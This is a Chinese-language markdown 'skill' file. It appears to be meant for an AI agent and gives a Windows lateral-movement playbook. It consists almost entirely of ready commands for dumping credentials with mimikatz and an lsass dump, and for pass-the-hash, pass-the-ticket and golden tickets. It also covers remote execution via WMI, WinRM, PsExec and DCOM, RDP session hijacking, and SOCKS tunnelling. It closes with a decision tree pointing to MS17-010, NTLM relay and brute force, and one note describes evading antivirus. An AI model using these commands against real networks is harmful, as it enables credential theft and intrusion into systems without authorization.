---
name: lateral-movement
description: 内网横向移动，覆盖PTH→PTT→WMI→WinRM→PSExec→DCOM→RDP→SSH隧道→凭证窃取全流程
---

# 内网横向移动

## 1. 凭证获取

```bash
# mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
lsadump::sam
lsadump::secrets

# 内存转储
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 本地分析: sekurlsa::minidump lsass.dmp → sekurlsa::logonpasswords

# 浏览器密码
# Chrome: %LocalAppData%\Google\Chrome\User Data\Default\Login Data
# 工具: SharpWeb, LaZagne
```

## 2. Pass-The-Hash (PTH)

```bash
# Impacket
psexec.py -hashes :<NTLM_HASH> DOMAIN/User@target
wmiexec.py -hashes :<NTLM_HASH> DOMAIN/User@target
smbexec.py -hashes :<NTLM_HASH> DOMAIN/User@target
atexec.py -hashes :<NTLM_HASH> DOMAIN/User@target

# mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<hash> /run:cmd.exe

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u User -H <NTLM_HASH>
crackmapexec smb 192.168.1.0/24 -u User -H <NTLM_HASH> -x whoami
```

## 3. Pass-The-Ticket (PTT)

```bash
# 导出票据
mimikatz # sekurlsa::tickets /export

# 注入票据
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus (推荐, 可避免mimikatz杀软检测)
Rubeus.exe triage                    # 列出所有票据
Rubeus.exe dump /service:krbtgt      # 导出krbtgt票据
Rubeus.exe asktgt /user:User /rc4:<NTLM>  # 请求TGT

# Golden Ticket
mimikatz # kerberos::golden /domain:DOMAIN /sid:S-1-5-21-XXX /krbtgt:<hash> /user:Administrator /ticket:golden.kirbi
```

## 4. WMI / WinRM

```bash
# WMI远程执行
wmic /node:target /user:DOMAIN\User /password:pass process call create "cmd.exe /c whoami"
wmiexec.py DOMAIN/User:pass@target

# WinRM
winrs -r:target -u:DOMAIN\User -p:pass "whoami"
evil-winrm -i target -u User -p pass
evil-winrm -i target -u User -H <NTLM_HASH>
```

## 5. PSExec / SMBExec

```bash
# Sysinternals PSExec
PsExec.exe \\target -u DOMAIN\User -p pass cmd.exe
PsExec.exe \\target -s cmd.exe  # SYSTEM权限

# Impacket
psexec.py DOMAIN/User:pass@target
smbexec.py DOMAIN/User:pass@target
```

## 6. DCOM / MMC

```powershell
# MMC20.Application
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
# ShellWindows / ShellBrowserWindow / ExcelDDE
```

## 7. RDP

```bash
# RDP会话劫持 (需SYSTEM)
query session
tscon <session_id> /dest:<your_session>

# xfreerdp (PTH)
xfreerdp /u:Administrator /d:DOMAIN /pth:<NTLM_HASH> /v:target

# Restricted Admin模式
mstsc.exe /restrictedAdmin /v:target
```

## 8. 隧道与代理

```bash
# SSH隧道
ssh -D 1080 user@pivot              # SOCKS5动态转发
ssh -L 445:target:445 user@pivot    # 本地转发单个端口

# chisel
# Server: ./chisel server -p 8000 --reverse
# Client: ./chisel client server:8000 R:1080:socks

# ligolo-ng — 现代隧道工具
# proxychains — 配合SOCKS代理使用任何工具

# SSHUTTLE — VPN-like
sshuttle -r user@pivot 10.0.0.0/8
```

## 9. 横向移动決策樹

```
获取凭证
├─ NTLM Hash → PTH: psexec/wmiexec/smbexec
├─ 明文密码 → WinRM (evil-winrm) / PSExec / RDP
├─ Kerberos TGT → PTT (Rubeus/mimikatz)
├─ Kerberos TGS → 访问特定服务 (Silver Ticket)
└─ 仅有网络访问
    ├─ SMB开放 → MS17-010 / SMB签名禁用 → NTLM Relay
    ├─ RDP开放 → 暴力破解 / CVE-2019-0708
    └─ Web服务开放 → Web漏洞 → 获取Shell → 提取凭证
```

---

*参考: Impacket + CrackMapExec + HackTricks Lateral Movement*
